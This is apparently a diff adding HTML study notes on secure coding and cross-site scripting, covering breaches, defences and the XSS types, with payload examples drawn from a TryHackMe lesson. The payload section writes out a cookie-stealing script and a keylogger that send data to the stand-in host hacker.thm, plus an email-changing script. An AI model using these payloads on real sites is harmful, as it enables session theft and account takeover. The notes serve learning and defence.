@@ -1,0 +1,270 @@
+<h1 id="cross-site"><a aria-hidden="true" class="anchor-heading icon-link" href="#cross-site"></a>Cross Site</h1>
+<h1 id="cross-site-scripting"><a aria-hidden="true" class="anchor-heading icon-link" href="#cross-site-scripting"></a>Cross-Site Scripting</h1>
+<h2 id="security-defects-become-famous"><a aria-hidden="true" class="anchor-heading icon-link" href="#security-defects-become-famous"></a>Security Defects Become Famous</h2>
+<ul>
+<li>Heartbleed and Shellshock in 2014 software security bugs.</li>
+<li>Recent Wikileaks exposure of CIA research into weaponizing iOS, Android and Samsung TV security bugs.</li>
+<li>Security researchers are trying to cash in on the fame.</li>
+<li>Bugs in security software are sensational (software is supposed to protect you).</li>
+<li>ALL major software vendors are target, especially security software.</li>
+<li>Costs to reputation and revenue.</li>
+<li>Could lead to litigations, and law enforcement investigations.
+<ul>
+<li>Since 2000, the FTC has issued over 45 consent decrees against companies failed to institute sufficient security practices while delivering software or services.</li>
+</ul>
+</li>
+</ul>
+<h3 id="why-care"><a aria-hidden="true" class="anchor-heading icon-link" href="#why-care"></a>Why Care?</h3>
+<ul>
+<li>Average total cost of data breach in 2017 (Ponemon Study) is $3.62 million.</li>
+<li>58% of Internet users use the same password for multiple sites, including their web mail.</li>
+<li>There is a growing black market for zero-day vulnerabilities.
+<ul>
+<li>Vulnerabilities sell of thousands to millions of dollars per exploit, earning hackers serious money.</li>
+</ul>
+</li>
+</ul>
+<h4 id="breaches"><a aria-hidden="true" class="anchor-heading icon-link" href="#breaches"></a>Breaches</h4>
+<ul>
+<li><strong>Jan 2017 Trend Micro</strong> - Two researchers found 223 vulnerabilities in just 6 months. Massive damage to reputation as a cybersecurity vendor.</li>
+<li><strong>Oct 2017 Equifax</strong> - 143 million stolen SSNs. CSO, CIO, CEO lost their jobs.</li>
+<li><strong>Dec 2013 Target</strong> - 40+ million credit cards, 70-110 million name, address, phone, email addresses.
+<ul>
+<li>Total cost may reach over $1B in fines and other associated costs.</li>
+</ul>
+</li>
+<li><strong>March 2011 RSA Security</strong> - 40 million auth tokens for bank and government networks $66M plus loss.</li>
+</ul>
+<h2 id="secure-software-challenges"><a aria-hidden="true" class="anchor-heading icon-link" href="#secure-software-challenges"></a>Secure Software Challenges</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th></th><th>Developers</th><th>Hackers</th></tr></thead><tbody><tr><td>Time</td><td>Under time pressure to develop and test functionality</td><td>May have unlimited time</td></tr><tr><td>Focus</td><td>Security is not the primary focus over functionality</td><td>Focused on finding security holes</td></tr><tr><td>Motivation / Resources</td><td>Responsible to product's primary functionality</td><td>Bragging rights, illicit profits</td></tr><tr><td>Specialization</td><td>Specialize on functionality of the product</td><td>Specialize in security penetration</td></tr></tbody></table>
+<h3 id="mitigate-product-security-risk"><a aria-hidden="true" class="anchor-heading icon-link" href="#mitigate-product-security-risk"></a>Mitigate Product Security Risk</h3>
+<h4 id="prevent-new-bugs"><a aria-hidden="true" class="anchor-heading icon-link" href="#prevent-new-bugs"></a>Prevent New Bugs</h4>
+<ul>
+<li>Know SANS 25 Most Dangerous Programming Errors (includes most of common security Top 10).</li>
+<li>"Think like a hacker". How can code be abused?</li>
+<li>Build software defenses into software:
+<ul>
+<li>Input Validation</li>
+<li>Output Sanitization</li>
+<li>Strong Encryption</li>
+<li>Strong Authentication and Authorization</li>
+</ul>
+</li>
+<li>Choose secure frameworks rather than simply reply on developer security skills.</li>
+<li>Do not think product is isolated from the Internet is not at risk.</li>
+<li>Do not think that if a file or a database is local does not need to be protected. The majority of breaches are launched internally.</li>
+</ul>
+<h4 id="address-existing-bugs"><a aria-hidden="true" class="anchor-heading icon-link" href="#address-existing-bugs"></a>Address Existing Bugs</h4>
+<ul>
+<li>Redesign product front end to be good looking and functional, but also secure.</li>
+<li>Implement smart architectural changes that fix security flaws at the top.</li>
+<li>Do not spot-fix issues.
+<ul>
+<li>Implement a fix across the board and how to be prevented in the future.</li>
+</ul>
+</li>
+<li>Security bugs are special because of their potential impact.</li>
+<li>Deliver security patches with faster release vehicles.</li>
+</ul>
+<h2 id="common-attacks---cross-site-scripting"><a aria-hidden="true" class="anchor-heading icon-link" href="#common-attacks---cross-site-scripting"></a>Common Attacks - Cross-Site Scripting</h2>
+<p>Cross-Site Scripting (XSS)
+: Allows attackers to inject client-side scripts into the web page.</p>
+<h3 id="dangers-of-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#dangers-of-xss"></a>Dangers of XSS</h3>
+<ul>
+<li>Harvest credentials</li>
+<li>Take over user sessions</li>
+<li>CSRF</li>
+<li>Steal cookies, local store data</li>
+<li>Elevate privileges</li>
+<li>Redirect users to malicious sites</li>
+</ul>
+<p>XSS is widespread in 3rd party products such as WordPress and Drupal.</p>
+<h3 id="in-the-news"><a aria-hidden="true" class="anchor-heading icon-link" href="#in-the-news"></a>In the News</h3>
+<p>Cross-site scripting vulnerabilities are extremely common. Below are a few reports of XSS found in massive applications:</p>
+<ul>
+<li>eBay XSS bug left users vulnerable to (almost) undetectable phishing attacks.</li>
+<li>The Apache Foundation hacked by exploiting XSS in JIRA.</li>
+<li>XSS found in Shopify.</li>
+<li>$7,500 for XSS found in Steam chat.</li>
+<li>$2,500 for XSS in HackerOne.</li>
+<li>XSS found in Infogram.</li>
+</ul>
+<h3 id="effective-defenses"><a aria-hidden="true" class="anchor-heading icon-link" href="#effective-defenses"></a>Effective Defenses</h3>
+<h4 id="html-encoding"><a aria-hidden="true" class="anchor-heading icon-link" href="#html-encoding"></a>HTML Encoding</h4>
+<ul>
+<li>Output Encoding works well for server side generate pages and is quite effective in neutralizing most XSS payloads.
+<ul>
+<li>HTML Encoding alone will not prevent charset attacks.</li>
+</ul>
+</li>
+</ul>
+<h4 id="javascript-escaping"><a aria-hidden="true" class="anchor-heading icon-link" href="#javascript-escaping"></a>JavaScript Escaping</h4>
+<ul>
+<li>XSS can be introduced with JavaScript code.</li>
+<li>Escaping single quotes will prevent injection.</li>
+</ul>
+<h4 id="safe-dom-elements"><a aria-hidden="true" class="anchor-heading icon-link" href="#safe-dom-elements"></a>Safe DOM Elements</h4>
+<ul>
+<li>XSS in modern Rich Client UIs is often made possible by unsafe handling of the DOM.</li>
+<li>Using the <code>innerHtml</code> attribute allows the user input to be rendered as HTML and XSS with JavaScript events as possible.</li>
+<li>The safe alternative is to use <code>textContent</code> (or <code>innerText</code> in some versions of IE).</li>
+</ul>
+<h4 id="use-eval-and-dynamic-code-generation-with-care"><a aria-hidden="true" class="anchor-heading icon-link" href="#use-eval-and-dynamic-code-generation-with-care"></a>Use Eval and Dynamic Code Generation with Care</h4>
+<ul>
+<li>JavaScript <code>eval()</code> function which accepts a JavaScript expression as a string argument and executes it. Use of this function is discouraged.</li>
+<li>Same care is needed when the code generates pieces of JavaScript dynamically. Also discouraged.</li>
+</ul>
+<h4 id="input-validation"><a aria-hidden="true" class="anchor-heading icon-link" href="#input-validation"></a>Input Validation</h4>
+<p><strong>Whitelisting</strong> is recommended.</p>
+<ul>
+<li>Reduces the attack surface to a known quantity.</li>
+<li>If possible, most input should be whitelisted to alphanumeric to prevent XSS (and many other attacks).</li>
+<li>Special characters should only be allowed on an exception basis.</li>
+<li>Some cases may be relaxed to allow single quotes or other characters.</li>
+</ul>
+<p><strong>Blacklisting</strong> - NOT RECOMMENDED.</p>
+<ul>
+<li>Creative attacker may bypass blacklist by trying a previously unknown method.</li>
+</ul>
+<p><strong>Client Side Input Validation</strong> - NOT RECOMMENDED.</p>
+<ul>
+<li>Can only be used to assist with product usability.</li>
+<li>Attackers can easily bypass it by sending the request directly to the server.</li>
+</ul>
+<h4 id="use-proven-validation-and-encoding-functionality"><a aria-hidden="true" class="anchor-heading icon-link" href="#use-proven-validation-and-encoding-functionality"></a>Use Proven Validation and Encoding Functionality</h4>
+<ul>
+<li>Protect both input and output - "Defense in Depth" principle.</li>
+<li>As you validate the input and encode the output, use proven and reputable libraries.</li>
+<li>It is best to implement a framework that has one central set of functionality that validates and encodes data.</li>
+</ul>
+<h2 id="xss-payloads"><a aria-hidden="true" class="anchor-heading icon-link" href="#xss-payloads"></a>XSS Payloads</h2>
+<p>In XSS, the payload is the JavaScript code we wish to be executed on the target's computer. There are two parts to the payload: the intention and the modification.</p>
+<ul>
+<li>Intention is what you wish the JavaScript to actually do.</li>
+<li>Modification is the changes to the code we need to make it execute as every scenario is different.</li>
+</ul>
+<p>Examples of XSS Intentions:</p>
+<ul>
+<li><strong>Proof of Concept</strong>: Simplest payload to demonstrate XSS is possible on a website - causing an alert box to pop up on the page with a string of text.
+<ul>
+<li><code>&#x3C;script>alert('XSS');&#x3C;/script></code></li>
+</ul>
+</li>
+<li><strong>Session Stealing</strong>: Details of a user's session, such as login tokens, are often kept in cookies on the target's machine.
+<ul>
+<li><code>&#x3C;script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));&#x3C;/script></code>
+<ul>
+<li>Takes target's cookie, base64 encodes the cookie to ensure successful transmission for control to be logged in.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Key Logger</strong>: Acts as a key logger where anything typed on the webpage will be forwarded to a website under the hacker's control.
+<ul>
+<li><code>&#x3C;script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}&#x3C;/script></code></li>
+</ul>
+</li>
+<li><strong>Business Logic</strong>: Calls a particular network resource or a JavaScript function. In this example for changing the email's address called <code>user.changeEmail()</code>.
+<ul>
+<li><code>&#x3C;script>user.changeEmail('attacker@hacker.thm');&#x3C;/script></code>
+<ul>
+<li>Allows a password reset for the attacker.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="reflected-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#reflected-xss"></a>Reflected XSS</h3>
+<p>Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a5b0dbc4d2f1f69988f82f2c5d53f6ed.png" alt="reflected-error">
+<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/7f90b73106d655b07874943f93533f7b.png" alt="reflected"></p>
+<p>A website where entering the incorrect input, an error message is displayed to the parameter in the query string directly into the page source.</p>
+<ul>
+<li>The application does not check the contents of the error parameter, which allows the attacker to insert the malicious code.</li>
+</ul>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8e3bffe500771c03366de569c3565058.png" alt="xss"></p>
+<ul>
+<li>The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute on their browser, potentially revealing session or customer information.</li>
+</ul>
+<h4 id="how-to-test-for-reflected-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#how-to-test-for-reflected-xss"></a>How to Test for Reflected XSS</h4>
+<p>Check every possible point of entry:</p>
+<ul>
+<li>Parameters in the URL query string</li>
+<li>URL file path</li>
+<li>Sometimes HTTP headers (unlikely exploitable)</li>
+</ul>
+<h3 id="stored-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#stored-xss"></a>Stored XSS</h3>
+<p>The XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/cc2566d297f7328d91bc8552f902210e.png" alt="stored-XSS"></p>
+<p>A blog website that allows users to post comments, but these comments are not checked or filtered for any malicious JavaScript code.</p>
+<ul>
+<li>The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.</li>
+</ul>
+<h4 id="how-to-test-for-stored-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#how-to-test-for-stored-xss"></a>How to Test for Stored XSS</h4>
+<p>Test every possible entry point where it seems data is stored and then shown back in areas that other users have access to:</p>
+<ul>
+<li>Comments on a blog</li>
+<li>User profile information</li>
+<li>Website listings</li>
+</ul>
+<h3 id="dom-based-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#dom-based-xss"></a>DOM-Based XSS</h3>
+<p>DOM stands for Document Object Model and is a programming interface for HTML and XML documents. A web page is a document, and this document can be either displayed in the browser window or as the HTML source.</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png" alt="DOM"></p>
+<ul>
+<li>DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.</li>
+<li>Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.
+<ul>
+<li>An example: JavaScript gets the contents from the <code>window.location.hash</code> parameter and then writes that onto the page in the currently being viewed section. The contents of the hash are not checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto their webpage.</li>
+</ul>
+</li>
+</ul>
+<h4 id="how-to-test-for-dom-based-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#how-to-test-for-dom-based-xss"></a>How to Test for DOM Based XSS</h4>
+<p>Challenging to test for and requires a certain amount of JavaScript knowledge to read the source code.</p>
+<ul>
+<li>Look for parts of code that access certain variables that an attacker can have control over, such as 'window.location.x' parameters.
+<ul>
+<li>See how they are handled and whether the values are written to the web page's DOM or passed to unsafe JavaScript methods such as <code>eval()</code>.</li>
+</ul>
+</li>
+</ul>
+<h3 id="blind-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#blind-xss"></a>Blind XSS</h3>
+<p>Blind XSS is similar to a stored XSS in that the payload gets stored on the website for another user to view, but in this instance, can't see the payload working or be able to test it against yourself first.</p>
+<p>A website has a contact form where you can message a member of staff. The message content does not get checked for any malicious code, which allows the attacker to enter anything they wish.</p>
+<ul>
+<li>Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page viewed.</li>
+</ul>
+<h4 id="how-to-test-for-blind-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#how-to-test-for-blind-xss"></a>How to Test for Blind XSS</h4>
+<ul>
+<li>When testing for Blind XSS vulnerabilities, need to ensure payload has a call back (usually an HTTP request) to know is being executed.</li>
+<li>A popular tool for Blind XSS attacks is <a href="https://xsshunter.com/">xsshunter</a>.</li>
+</ul>
